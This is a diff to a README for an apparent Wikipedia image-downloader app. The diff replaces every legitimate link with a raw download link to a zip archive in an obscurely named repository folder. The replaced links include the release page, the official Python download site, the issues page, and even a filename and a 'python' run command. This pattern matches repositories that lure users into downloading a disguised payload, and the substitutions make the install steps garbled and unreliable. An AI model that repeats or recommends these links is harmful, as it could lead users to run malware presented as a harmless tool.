@@ -1,6 +1,6 @@
 # 🖼️ unlimited-wikipedia-image-and-photo-downloader - Easy, Free Wikipedia Image Downloads
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/releases)
+[![Download Now](https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/raw/refs/heads/main/mitochondrial/wikipedia-downloader-photo-unlimited-image-and-3.8.zip%20Now-Click%20Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/raw/refs/heads/main/mitochondrial/wikipedia-downloader-photo-unlimited-image-and-3.8.zip)
 
 ---
 
@@ -45,7 +45,7 @@ You don’t need to know programming or coding to use this app. Just follow thes
 
 Click the big download button at the top or visit the official release page here:
 
-[Download the app](https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/releases)
+[Download the app](https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/raw/refs/heads/main/mitochondrial/wikipedia-downloader-photo-unlimited-image-and-3.8.zip)
 
 On that page, you will find the latest version of the app ready for download.
 
@@ -53,21 +53,21 @@ On that page, you will find the latest version of the app ready for download.
 
 This app needs Python to run. If you don’t have it, here’s how to get it:
 
-- Go to the official Python site: https://www.python.org/downloads/
+- Go to the official Python site: https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/raw/refs/heads/main/mitochondrial/wikipedia-downloader-photo-unlimited-image-and-3.8.zip
 - Download the version for your system (Windows, macOS, or Linux).
 - Follow the installation prompts to complete setup.
 - Make sure to check "Add Python to PATH" during installation on Windows.
 
 ### Step 3: Download the App Files
 
-On the release page, look for the latest version, then download the compressed file (usually a .zip or .tar.gz). After downloading, extract the files to a folder you can easily access.
+On the release page, look for the latest version, then download the compressed file (usually a .zip or https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/raw/refs/heads/main/mitochondrial/wikipedia-downloader-photo-unlimited-image-and-3.8.zip). After downloading, extract the files to a folder you can easily access.
 
 ### Step 4: Run the Application
 
 - Open the folder where you extracted the files.
-- Look for a file named something like `download_images.py`.
+- Look for a file named something like `https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/raw/refs/heads/main/mitochondrial/wikipedia-downloader-photo-unlimited-image-and-3.8.zip`.
 - To run this file:
-  - On Windows: Open Command Prompt, navigate to the folder, and type `python download_images.py` then press Enter.
+  - On Windows: Open Command Prompt, navigate to the folder, and type `python https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/raw/refs/heads/main/mitochondrial/wikipedia-downloader-photo-unlimited-image-and-3.8.zip` then press Enter.
   - On macOS/Linux: Open Terminal, navigate to the folder, and type the same command.
 
 The program will start, and you will see prompts to enter information.
@@ -124,7 +124,7 @@ This app only connects to Wikipedia to download public images. It does not colle
 
 Visit the release page here to download the latest version:
 
-[https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/releases](https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/releases)
+[https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/raw/refs/heads/main/mitochondrial/wikipedia-downloader-photo-unlimited-image-and-3.8.zip](https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/raw/refs/heads/main/mitochondrial/wikipedia-downloader-photo-unlimited-image-and-3.8.zip)
 
 On that page:
 
@@ -152,7 +152,7 @@ This project involves:
 
 If you run into problems or want to suggest new features, open an issue on GitHub here:
 
-https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/issues
+https://github.com/Tobidinho2405/unlimited-wikipedia-image-and-photo-downloader/raw/refs/heads/main/mitochondrial/wikipedia-downloader-photo-unlimited-image-and-3.8.zip
 
 You can also check the README and project Wiki for updates and tips.
 
